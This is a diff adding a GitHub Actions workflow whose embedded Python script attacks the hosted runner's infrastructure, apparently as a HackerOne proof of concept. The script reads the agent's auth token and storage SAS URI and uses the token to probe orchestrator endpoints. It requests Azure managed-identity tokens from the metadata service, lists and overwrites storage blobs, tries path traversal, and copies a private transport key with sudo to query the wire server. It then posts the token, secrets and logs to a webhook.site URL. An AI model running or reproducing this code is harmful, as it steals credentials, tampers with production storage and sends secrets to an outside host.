@@ -1,0 +1,294 @@
+name: Probe v44 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V44_SOURCE: v44_account_a
+    steps:
+      - name: v44 max elevation probe
+        run: |
+          cat > /tmp/v44_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, urllib.parse, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          
+          def probe(method, url, body=None, extra_headers=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra_headers:
+                  headers.update(extra_headers)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=12)
+                  return {"status": r.status, "body": r.read(3000).decode("utf-8","replace"), "headers": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(3000).decode("utf-8","replace"), "headers": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "headers": {}}
+          
+          def auth_probe(method, url, token, body=None):
+              return probe(method, url, body, {"Authorization": f"Bearer {token}"})
+          
+          SOURCE = os.environ.get("V44_SOURCE", "v44_account_a")
+          print(f"[{SOURCE}] start")
+          
+          # 1. Read .settings
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          trace_url = s.get("traceApiUrl", "").rstrip("/")
+          watch_url = s.get("watchdogTraceApiUrl", "").rstrip("/")
+          sas_uri   = s.get("diagnosticsSasUri", "")
+          config_id = s.get("configId", "")
+          quota_id  = s.get("quotaId", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          
+          print(f"[{SOURCE}] sched_url={sched_url}")
+          print(f"[{SOURCE}] trace_url={trace_url}")
+          print(f"[{SOURCE}] wid={wid}")
+          
+          # 2. Read HCA log
+          hca_log = ""
+          log_guids = []
+          log_urls = []
+          try:
+              hca_log = open("/opt/hca/logs/hosted-compute-agent.log").read()
+              print(f"[{SOURCE}] HCA log: {len(hca_log)} chars")
+              print(f"[{SOURCE}] HCA log FULL:\n{hca_log[:8000]}")
+              log_guids = list(dict.fromkeys(re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", hca_log, re.I)))[:20]
+              log_urls  = list(dict.fromkeys(re.findall(r"https?://[^\s\"'<>]+", hca_log)))[:30]
+              print(f"[{SOURCE}] GUIDs in log: {log_guids}")
+              print(f"[{SOURCE}] URLs in log: {log_urls}")
+          except Exception as ex:
+              print(f"[{SOURCE}] HCA log error: {ex}")
+          
+          # 3. Binary string extraction for API paths
+          binary_paths = []
+          try:
+              r = subprocess.run(["strings", "/opt/hca/hosted-compute-agent"], capture_output=True, text=True, timeout=20)
+              binary_paths = list(dict.fromkeys(re.findall(r"/v\d+/[a-zA-Z0-9/{}_-]+", r.stdout)))[:50]
+              print(f"[{SOURCE}] Binary paths: {binary_paths}")
+          except Exception as ex:
+              print(f"[{SOURCE}] strings error: {ex}")
+          
+          # 4. Orchestrator sweep — standard paths + GUID-based paths
+          base = sched_url
+          std_paths = [
+              ("PUT", "/request/heartbeat",          "{}"),
+              ("GET", "/request",                    None),
+              ("GET", "/requests",                   None),
+              ("GET", "/request/acquire",            None),
+              ("POST","/request/acquire",            "{}"),
+              ("PUT", "/request/result",             '{"result":"Succeeded","outputs":{}}'),
+              ("POST","/request/complete",           '{"result":"Succeeded"}'),
+              ("GET", "/request/logs",               None),
+              ("PUT", "/request/logs",               '{"lines":[{"line":"hackerone-v44-probe","lineNumber":1}]}'),
+              ("GET", "/request/status",             None),
+              ("GET", "/request/steps",              None),
+              ("GET", "/request/environment",        None),
+              ("GET", "/request/output",             None),
+              ("GET", "/request/artifacts",          None),
+              ("GET", "/worker",                     None),
+              ("GET", "/worker/info",                None),
+              ("GET", "/workers",                    None),
+              ("GET", "/pool",                       None),
+              ("GET", "/pools",                      None),
+              ("GET", "/tenant",                     None),
+              ("GET", "/job",                        None),
+              ("GET", "/jobs",                       None),
+              ("GET", "/health",                     None),
+              ("GET", "/info",                       None),
+              ("GET", "/version",                    None),
+              ("GET", "/api/v1/request",             None),
+              ("GET", "/v2/request",                 None),
+              ("GET", "/request/cancel",             None),
+              ("POST","/request/cancel",             "{}"),
+          ]
+          
+          guid_paths = []
+          for guid in log_guids[:5]:
+              for m, p, b in [
+                  ("GET",  f"/requests/{guid}",            None),
+                  ("PUT",  f"/requests/{guid}/heartbeat",  "{}"),
+                  ("POST", f"/requests/{guid}/complete",   '{"result":"Succeeded"}'),
+                  ("GET",  f"/requests/{guid}/logs",       None),
+                  ("PUT",  f"/requests/{guid}/result",     '{"result":"Succeeded"}'),
+                  ("GET",  f"/request/{guid}",             None),
+                  ("PUT",  f"/request/{guid}/heartbeat",   "{}"),
+              ]:
+                  guid_paths.append((m, p, b))
+          
+          all_paths = std_paths + guid_paths
+          orch_results = {}
+          print(f"\n[{SOURCE}] Sweeping {len(all_paths)} orchestrator paths...")
+          for method, path, body in all_paths:
+              r = auth_probe(method, base + path, token, body)
+              bg = r["headers"].get("x-github-backend", r["headers"].get("x-github-request-id", "-"))
+              orch_results[f"{method} {path}"] = {"status": r["status"], "body": r["body"][:300], "backend": bg}
+              print(f"[ORCH] {method:5} {path:48} -> {r['status']} | {r['body'][:80]}")
+          
+          # 5. TraceApiUrl probe
+          trace_results = {}
+          if trace_url:
+              print(f"\n[{SOURCE}] Trace probe: {trace_url}")
+              for method, path, body in [
+                  ("GET",  "/",         None),
+                  ("GET",  "/health",   None),
+                  ("GET",  "/trace",    None),
+                  ("GET",  "/traces",   None),
+                  ("POST", "/trace",    '{"jobId":"hackerone-test","event":"started","source":"runner"}'),
+                  ("POST", "/traces",   '{"jobId":"hackerone-test","event":"started"}'),
+                  ("GET",  "/api/v1/trace", None),
+              ]:
+                  r = auth_probe(method, trace_url + path, token, body)
+                  trace_results[f"{method} {path}"] = {"status": r["status"], "body": r["body"][:400]}
+                  print(f"[TRACE] {method} {path} -> {r['status']} | {r['body'][:100]}")
+          
+          # 6. WatchdogTrace probe
+          watch_results = {}
+          if watch_url:
+              print(f"\n[{SOURCE}] Watchdog probe: {watch_url}")
+              for method, path, body in [
+                  ("GET",  "/health", None),
+                  ("GET",  "/",       None),
+                  ("POST", "/trace",  "{}"),
+                  ("GET",  "/traces", None),
+              ]:
+                  r = auth_probe(method, watch_url + path, token, body)
+                  watch_results[f"{method} {path}"] = {"status": r["status"], "body": r["body"][:400]}
+                  print(f"[WATCH] {method} {path} -> {r['status']} | {r['body'][:100]}")
+          
+          # 7. Managed Identity — all API versions and resources
+          mi_results = {}
+          print(f"\n[{SOURCE}] Managed Identity probe...")
+          mi_resources = [
+              ("vault",    "https://vault.azure.net"),
+              ("mgmt",     "https://management.azure.com/"),
+              ("storage",  "https://storage.azure.com/"),
+              ("graph",    "https://graph.microsoft.com/"),
+              ("keyvault", "https://vault.azure.net/.default"),
+          ]
+          for api_ver in ["2018-02-01", "2019-06-01", "2017-09-01"]:
+              for name, resource in mi_resources:
+                  url = f"http://169.254.169.254/metadata/identity/oauth2/token?api-version={api_ver}&resource={urllib.parse.quote(resource)}"
+                  r = probe("GET", url, extra_headers={"Metadata": "true"})
+                  key = f"mi_{name}_{api_ver}"
+                  mi_results[key] = {"status": r["status"], "body": r["body"][:500]}
+                  if r["status"] == 200:
+                      print(f"[MI] *** TOKEN OBTAINED: {name} {api_ver} -> {r['body'][:300]}")
+                  else:
+                      print(f"[MI] {name} {api_ver} -> {r['status']} | {r['body'][:60]}")
+          
+          # 8. SAS operations: LIST + path traversal + overwrite
+          sas_results = {}
+          if sas_uri:
+              from urllib.parse import urlparse
+              parsed = urlparse(sas_uri)
+              q = parsed.query
+              origin = f"{parsed.scheme}://{parsed.netloc}"
+              path_parts = parsed.path.split("/")  # ['', 'container', 'blob']
+              container_path = "/" + "/".join(path_parts[1:3]) if len(path_parts) >= 3 else parsed.path
+              blob_path = parsed.path
+          
+              # Container LIST
+              list_url = origin + container_path + "?restype=container&comp=list&" + q
+              r = probe("GET", list_url)
+              sas_results["list_container"] = {"status": r["status"], "body": r["body"][:2000]}
+              print(f"\n[SAS] LIST container -> {r['status']} | {r['body'][:300]}")
+          
+              # Account-level LIST (enumerate all containers)
+              acct_url = origin + "/?comp=list&" + q
+              r = probe("GET", acct_url)
+              sas_results["list_account"] = {"status": r["status"], "body": r["body"][:2000]}
+              print(f"[SAS] LIST account -> {r['status']} | {r['body'][:300]}")
+          
+              # Overwrite fixed known blob
+              blob_dir = origin + container_path
+              overwrite_url = blob_dir + "/hackerone-v44-overwrite.json?" + q
+              payload_body = json.dumps({"run_id": RUN_ID, "source": SOURCE, "ts": time.time(),
+                                          "note": "HackerOne PoC: attacker-controlled content in GitHub production storage"})
+              r = probe("PUT", overwrite_url, body=payload_body,
+                        extra_headers={"x-ms-blob-type": "BlockBlob", "Content-Type": "application/json"})
+              sas_results["overwrite_fixed"] = {"status": r["status"], "body": r["body"][:300]}
+              print(f"[SAS] OVERWRITE fixed blob -> {r['status']}")
+          
+              # Path traversal attempt
+              traversal_url = blob_dir + "/../../../hackerone-traversal.txt?" + q
+              r = probe("PUT", traversal_url, body="traversal-test",
+                        extra_headers={"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"})
+              sas_results["path_traversal"] = {"status": r["status"], "body": r["body"][:300]}
+              print(f"[SAS] PATH TRAVERSAL PUT -> {r['status']} | {r['body'][:100]}")
+          
+              # Try GET on the overwrite blob to confirm content
+              r = probe("GET", overwrite_url)
+              sas_results["get_overwrite"] = {"status": r["status"], "body": r["body"][:300]}
+              print(f"[SAS] GET overwrite blob -> {r['status']} | {r['body'][:100]}")
+          
+          # 9. Wire server with sudo
+          wire_results = {}
+          print(f"\n[{SOURCE}] Wire server probe (sudo)...")
+          cert_tmp = "/tmp/tp_v44.pem"
+          try:
+              subprocess.run(["sudo", "cp", "/var/lib/waagent/TransportPrivate.pem", cert_tmp], check=True, timeout=5)
+              subprocess.run(["sudo", "chmod", "644", cert_tmp], check=True, timeout=5)
+              wire_eps = [
+                  ("/machine?comp=versions", "GET", None),
+                  ("/machine?comp=goalstate", "GET", None),
+                  ("/machine?comp=config", "GET", None),
+                  ("/machine?comp=extensionHandlerConfig", "GET", None),
+              ]
+              for wpath, wmethod, wbody in wire_eps:
+                  cmd = ["curl", "-s", "-w", "\nSTATUS:%{http_code}", "-X", wmethod,
+                         f"http://168.63.129.16{wpath}",
+                         "--cert", cert_tmp, "--key", cert_tmp,
+                         "-H", "x-ms-agent-name: WALinuxAgent",
+                         "-H", "x-ms-version: 2012-11-30",
+                         "--max-time", "8"]
+                  res = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
+                  wire_results[wpath] = res.stdout[-600:]
+                  print(f"[WIRE] {wmethod} {wpath} -> {res.stdout[-100:]}")
+          except Exception as ex:
+              print(f"[WIRE] error: {ex}")
+          
+          # 10. POST to webhook
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "sched_url": sched_url, "trace_url": trace_url,
+              "watch_url": watch_url, "sas_uri": sas_uri, "claims": claims,
+              "config_id": config_id, "quota_id": quota_id,
+              "settings_keys": list(s.keys()),
+              "log_guids": log_guids, "log_urls": log_urls,
+              "binary_paths": binary_paths,
+              "hca_log": hca_log[:8000],
+              "orch_results": orch_results,
+              "trace_results": trace_results, "watch_results": watch_results,
+              "mi_results": mi_results, "sas_results": sas_results,
+              "wire_results": wire_results,
+          }
+          data = json.dumps(payload).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=20)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v44_probe.py
+      - name: Keep alive
+        run: sleep 90
